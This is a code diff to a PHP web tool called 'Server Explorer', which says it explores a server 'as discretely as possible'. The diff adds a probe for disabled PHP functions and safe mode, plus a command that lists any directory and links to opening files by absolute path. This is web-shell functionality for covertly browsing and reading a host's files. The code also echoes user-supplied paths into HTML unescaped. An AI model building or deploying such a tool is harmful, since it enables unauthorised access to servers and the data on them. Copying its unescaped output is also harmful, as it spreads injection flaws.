@@ -189,6 +189,17 @@
         'download' => 'download the specified address to the disk at the specified location'*/
     );
 
+    function isFunctionAvailable($func) {
+        if (ini_get('safe_mode')) return false;
+        $disabled = ini_get('disable_functions');
+        if ($disabled) {
+            $disabled = explode(',', $disabled);
+            $disabled = array_map('trim', $disabled);
+            return !in_array($func, $disabled);
+        }
+        return true;
+    }
+
     function command_welcome($argv=array()) {
         echo '<p>Welcome to Server Explorer.<br>This tool will let you explore this server in several ways and as discretely'
             . ' as possible. Don\'t forget that unless you have been allowed to use this system (like in Jimmy\'s Demo) or'
@@ -201,9 +212,10 @@
 
     function command_help($argv=array()) {
         global $commandList;
-        echo '<h3>Available Commands:</h3><table>';
+        echo '<h3>Available Commands:</h3><table>'
+            . '<tr><th>Command</th><th>Description</th>';
         foreach(array_keys($commandList) as $command) {
-            echo '<tr><th><a href="' . $_SERVER["PHP_SELF"] . '?action=submit&command=' . $command . '">' . $command . '</a></th><td>' . $commandList[$command] . '</td></tr>';
+            echo '<tr><td><a href="' . $_SERVER["PHP_SELF"] . '?action=submit&command=' . $command . '">' . $command . '</a></td><td>' . $commandList[$command] . '</td></tr>';
         }
         echo '</table>';
     }
@@ -221,6 +233,7 @@
         global $commandListFS;
         // read first argument
         $comm = array_shift($argv);
+        echo " " . $comm;
         if (in_array($comm, array_keys($commandListFS))) {
             if (function_exists("command_fs_" . $comm)) {
                 call_user_func_array("command_fs_" . $comm, array($argv));
@@ -235,11 +248,37 @@
 
     function command_fs_help($argv=array()) {
         global $commandListFS;
-        echo '<h3>Available <b>F</b>ile<b>S</b>ystem commands</h3><table>';
+        echo '<h3>Available <b>F</b>ile<b>S</b>ystem commands</h3><table>'
+            . '<tr><th>Command</th><th>Description</th>';
         foreach(array_keys($commandListFS) as $command) {
-            echo '<tr><th><a href="' . $_SERVER['PHP_SELF'] . '?action=submit&command=fs%20' . $command . '">' . $command . '</th><td>' . $commandListFS[$command] . '</td></tr>';
+            echo '<tr><td><a href="' . $_SERVER['PHP_SELF'] . '?action=submit&command=fs%20' . $command . '">' . $command . '</td><td>' . $commandListFS[$command] . '</td></tr>';
         }
         echo '</table>';
+    }
+
+    function command_fs_ls($argv=array(".")) {
+        $path = $argv[0];
+        echo " " . $path;
+        $path = realpath($path);
+        echo '<h3>Contents of <b>F</b>ile<b>S</b>ystem</h3>'
+            . '<p class="subtitle">at <span class="path">' . $path . '</span></p>';
+        if (isFunctionAvailable(scandir)) {
+            echo '<table>';
+            foreach(scandir($path) as $file) {
+                echo '<tr>';
+                $realFile = realpath($path . "/" . $file);
+                if (is_dir($realFile)) {
+                    echo '<td><a href="' . $_SERVER["PHP_SELF"] . '?action=submit&command=fs%20ls%20' . urlencode('"' . $realFile . '"') . '">' . $file . '</a></td>';
+                } else {
+                    echo '<td><a href="' . $_SERVER["PHP_SELF"] . '?action=submit&command=fs%20open%20' . urlencode('"' . $realFile . '"') . '">' . $file . '</a></td>';
+                }
+                echo '</tr>';
+            }
+            echo '</table>';
+        } else {
+            echo '<p class="error">This function is not available on this server</p>';
+        }
+        
     }
 
     // write header
